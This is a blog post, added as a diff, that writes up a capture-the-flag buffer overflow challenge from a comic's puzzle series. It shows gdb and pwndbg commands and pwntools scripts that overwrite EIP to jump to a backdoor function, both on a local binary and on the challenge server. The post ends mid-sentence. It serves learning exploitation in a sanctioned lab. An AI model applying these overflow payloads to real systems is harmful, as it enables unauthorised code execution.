@@ -1,0 +1,217 @@
+---
+layout: ../../layouts/PostLayout.astro
+title: 'CTF: White Wolf (TFI Comics - Martina)'
+description: A write-up of the Martina - White Wolf CTF challenge from "The Future Is ******" issue #2. I go through how I got to where I did and what I learnt along the way.
+tags: ['ctf', 'cybersecurity', 'tficomic']
+slug: martina-white-wolf
+pubDate: '12th september, 2025'
+image: 
+---
+
+# White Wolf
+
+## Introduction
+
+Recently I subscribed to the new "The Future Is ******" comics and started digging through the different CTFs hidden throughout the issues. I did the first issue and the kickstarter challenges without making note of much of what I did, but issue 2 (Martina) had some much more complex and in depth problems to solve and I'm more likely to learn if I write it down and share that information, so here we go!
+
+This was my first ever buffer overflow challenge so there was a lot of learning here and probably a lot of dead ends I've forgotten to write down. What I'm trying to say is - this one was not easy if you didn't know what you were doing! There's a lot of moving pieces and a lot of places this could go wrong. 
+My final solution was very much a case of standing on the shoulders of giants. If you find that you're getting stuck, take some time to dig more into the tools you're using and the underlying theory. It will make it _a lot_ easier.
+
+## Where do we start?
+
+Looking at the challenge description we have two main points of entry. First there's a bunch of files download and investigate and then secondly there's a netcat command we can run. The description also tells us that there's a buffer overflow vulnerability. Very interesting.
+
+Pulling down the files there's a few things to not. First there's `flag.txt` file but given that it says it's a test I'm going to guess this is not one we should enter as a solution. I can also see a binary and a `.c` file with the same name. There's also a `Dockerfile` which I can assume allows us to run locally the same interface we have available through netcat.
+
+Having a look at the source code we can see a few things of note. Firstly, there's a `main` file which is the entry point for this script. It runs a few functions but the main one seems to be `vuln` which gives a prompt we can give input to and which looks like is the location of our buffer overflow vulnerability. I can also see that there's a function called `backdoor` which will output the contents of the `flag.txt` file (presumably the remote version of this script will print from a `flag.txt` file with the real flag).
+
+Finally, let's run both the local and remote versions of the binary. Running `./penance-rig` gives us the aforementioned prompt and giving it input tells us we don't have permissions. Running the netcat command gives us the same interface to a different version of the script.
+
+With all of these pieces in place, let's go research buffer overflow vulnerabilities.
+
+## What is a buffer overflow vulnerability?
+
+Okay, I'm going to cheat here and not actually write out what one is. There's two reasons for that:
+
+1. I'm still not super confident on the core fundamentals of this. I have a good idea of how it's working in a very hand wavey sense but it would be wrong for me to present myself as an expert.
+2. I found some really great blogs that explained it better than I ever could and they already have all the theory and diagrams you could need.
+
+I recommend you go give these a read and then come back here, but I'll also try keep what I say fairly self-contained if you're not prone to pursuing "Further Reading"
+
+- <https://lightfootlabs.io/blog/buffer-overflows-through-visuals>
+- <https://medium.com/@sigkilla9/linux-buffer-overflows-46833345382b>
+
+Okay, so what we basically need to know is that the program we're running is asking for some input and is storing it in a variable where it's set aside some memory (the buffer) to store whatever we give it. If the code isn't careful enough and we're nasty enough, we can provide the right kind of input to actually overflow that space and creep into other memory. This gives an error when we run the code:
+
+![Output from running `penance-rig`. The command line interface takes input, into which the letter A has been entered dozens of times. The program then says that the user is not authorised to perform that function before then s howing a `segmentation fault` error.](../../images/white-wolf/buffer-seg-fault-error.png)
+
+Digging through the above blog posts tells us that the way to exploit this is to find out the exact point at which the overflow starts and to then instead write the memory location of what we want to run/extract instead. There's more to it than this, and I'll get on to some of it as we go on, but that covers the general idea.
+
+## How do we do this?
+
+So the first tool we can use here is `gdb` which will allow us to debug the binary and inspect it as it runs. One of the key things it can give us quite easily is the location of the `backdoor` function in memory. (We technically have already got this from the challenge, but let's boots and braces this.) _Note: there's a lot of mention of prompts, commands and bits of terminology here that won't make a lot of sense unless you've either used a debugger before so I recommend going and reading about `gdb` if this is all new to you._
+
+Running `gdb ./penance-rig` should give us a prompt into the `gdb` interface. If we first run `break main` the debugger will set a breakpoint at the start of the `main` function. If we then enter `r` the debugger will run the binary up to the breakpoint.
+At this point we can then enter `info address backdoor` which will give us the memory address of that function. And look there, it's the same as the one in the challenge! Make a note of this somewhere you can easily copy, paste, and edit so that we can mess around with this.
+
+Okay, so the next step is to find out at what point our buffer overflows. My first thought here was that it would be somewhere around 64 characters, because we can see in the source code that the buffer is set to a size of `64`. This is _almost_ right, but it's not quite what we want. But we'll get on to that later.
+
+There's a few ways to work out the size of the buffer overflow we're looking for, some of which are better than others, but I'll start with my naive first attempt - just dumping stuff into the prompt. I didn't want to do this completely manually so I did a little python script in the terminal to make it a bit easier to tweak during this initial testing phase
+
+```bash
+python -c "print('A' * 72)" | ./penance-rig # where we tweaked that number to see when we get the segfault error
+```
+
+72! I wasn't miles off with my initial guess of 64, but I think there's a few extra characters in there to account for a few extra pieces in the stack. This is one of those places where I'm being intentionally vague because I don't want to mislead people with misinformation due to a lack of my own understanding. Based on the Lightfoot Labs blog linked above, I know that when we want to his a specific return address and overwrite it, we have to account for the rest of the stack frame. I got stuck on this for ages before using some better tools. I did try to use `gdb` and a bit of dynamic analysis to understand how each register was being filled up but I also d idn't fully understand the different registers at this point!
+
+I'll say here that I didn't write down every single dead end I pursued. There were many but they were all heading in approximately the right direction. Part of the problem was that my understanding of the problem was and is very surface level, but it was also that the tools I was using weren't best suited to someone with that level of understanding. I know roughly what it's doing, but if you're using relatively bare bones tooling like `gdb` then you need more than that.
+
+With all of this in mind, let's start to get on to when things started moving in a better direction.
+
+## `pwntools` and `pwndbg`
+
+Realising that farting about with `gdb` and manual bash one liners wasn't going to be enough I returned to the tomes and looked for some better tooling. I knew that "endianness" mattered based on the blogs Iwas reading but I was struggling to work out exactly how to convert the memory address I had into something I needed. I knew that what I needed was a bunch of junk to fill up the buffer and then an appropriate memory address adding in. Trying to handcraft this based on the Lightfoot Labs blog wasn't working for me. I managed to find the exact point at which I could trigger a seg fault _and_ do something with what followed it, but I couldn't get it to work. I was confused slightly by the fact the memory address given had an odd number of characters in it but the values needed to be passed in needed two digits each. I tried using cyber chef to swap the endianness of my value around and got the following:
+
+```bash
+python -c "print('A' * 72 + '\x00\x24\x49\x80')" | ./penance-rig # where we tweaked that number to see when we get the segfault error
+```
+
+BUT THIS DID NOT WORK. I was clearly misunderstanding how the address needed to be converted. I noticed that Lightfoot Labs suggested using `pwntools` to avoid doing these swaps by hand and at this point I was willing to spend the time getting it set up. Spoiler: This was the best decision I could have made.
+
+Whilst I'm very comfortable with downloading and setting up python virtualenvs and packages, I was less certain on how to use this set of tools to actually do what I needed to do. I did some digging to find a nice guide on using `pwntools` to actually do some buffer overflow exploits and found a really nice blog post that actually focussed on CTF competitions - <https://www.archcloudlabs.com/projects/pwntools-bof/>. This was the turning point in everything.
+
+Reading through the article one of the first things I noted was that they used a tool called `pwndbg` to make it easier to debug a binary for CTF competitions/exploits. Downloading this and doing some digging around gave me the following:
+
+![An image of the `pwndbg` interface. It shows a terminal screen and output from the tool. The commands run are cyclic, which provides a set of letters to use as input, and run, which runs the penance-rig binary. The output tells us that we hit the EIP register with the characters `taaa`](.../../images/white-wolf/pwndbg.png)
+
+This tool was excellent for finding out exactly what I needed to send to hit what I needed. It provided a set of easy to use tools that made it much easier to nail down exactly what I needed to exploit the overflow. The first thing I found out was that the number of characters I needed was 76 and not 72. I did this by taking the output from the screenshot above and then passing the string of letters that triggered the seg fault (`taaa`) into `cyclic -l taaa` and this tells us that the offset is at 76. I _think_ this is because what I explicitly needed for this challenge was to fill the `EIP` register.
+
+This was mentioned at various points in the Lightfoot Labs blog post but my brain just refused to take in the acronyms. The EIP register is the instructions point and allows us to tell the code to go where we want after it finishes. By filling this register specifically we can get it to go to the `backdoor` function.
+
+With this in mind I put together a script using `pwntools` based on the `pwn template` command to let me input our memory address exactly where we needed it.
+
+```python3
+#!/usr/bin/env python3
+
+
+# exploit.py
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or 'penance-rig')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     i386-32-little
+# RELRO:      Partial RELRO
+# Stack:      No canary found
+# NX:         NX unknown - GNU_STACK missing
+# PIE:        No PIE (0x8048000)
+# Stack:      Executable
+# RWX:        Has RWX segments
+# Stripped:   No
+# Debuginfo:  Yes
+
+io = start()
+
+
+payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa"
+payload += p32(0x8049240)
+print(payload)
+io.sendline(payload)
+io.interactive()
+```
+
+There's a lot going on here and I recommend reading the `pwntools` documentation to get a better sense of it, but the main things to note are that we start the binary and pass our payload into it via `io.interactive`, with `pwntools` taking care of parsing our memory address into the right format (_Note: when I printed this out I was 100% getting things mixed up. It was actually `\x40\x92\x04\x08`_).
+
+When we do this locally we see that the local test flag is passed back out to us! Success! Let's slap this payload into the prompt we get from `netcat` and go celebrate.
+
+Doesn't work.
+
+Now, I'm not sure of the exact reasoning as to why this doesn't do what I expected, but I am fairly certain it's down to however that prompt is encoded when I pass it in as plain text. It almost definitely doesn't line up exactly as expected and the memory address is almost definitely not parsed as a memory address.
+
+I drove myself insane trying to work out what caused this. I tried spinning up the local Dockerfile (which required me installing Docker again having only just uninstalled it that morning) and using that. This didn't actually help me get any closer to a solution but it did prove to me that the netcat solution needed something different to me piping the output from a python `print` statement into it. 
+
+I ended up going to the discord and asking if anyone could give me a hint and was rewarded with at least knowing that the solution I was pursuing was in roughly the right direction. Time to dig back in.
+
+As I was sat scratching my head bald, I had a sudden though - surely `pwntools` works remotely. Surely the answer isn't to test things locally and then try copying and pasting over some random text in the hope it works. I found myself a [`pwntools` cheatsheet](https://corgi.rip/posts/pwntools-cheatsheet/#basic-io) and was rewarded with finding that there is in fact a `remote` command that can be used for a remote server. Taking my previous script and swapping out the `io = start()` command for one that uses `remote()` gave me the following:
+
+```python3
+python
+#!/usr/bin/env python3
+
+
+# exploit.py
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or 'penance-rig')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     i386-32-little
+# RELRO:      Partial RELRO
+# Stack:      No canary found
+# NX:         NX unknown - GNU_STACK missing
+# PIE:        No PIE (0x8048000)
+# Stack:      Executable
+# RWX:        Has RWX segments
+# Stripped:   No
+# Debuginfo:  Yes
+
+io = remote("challenges.tficomic.io", 7200)
+payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa"
+payload += p32(0x8049240)
+print(payload)
+io.sendline(payload)
+io.interactive()
+```
+
+
+I then ran the script and... success! We have a flag.
+
+## Conclusion and Thanks
+
+
+What can we take away from this? First of all, spending time to understand what you're doing will save time in the long run. You can run around smashing `Ctrl-v` and pasting all sorts of scripts off the internet, but if you don't know what they're doing you're going to struggle with the challenges that require even a vague understanding of how the pieces work.
+Secondly, there are some really helpful people out there. People write blog posts that explain things simply and with just the right amount of detail. They create tools that strip away so much of the complexity involved in interacting with computers. And some people (a big thank you here to Setral in the Rekcah Publishing discord) respond to random discord messages without being remotely rude about my vagueness and inability to use DMs (I'll turn them back on when the British government no longer require me to dox myself to use them).
+
+I recommend taking time to read all the linked blog posts and 
+
+
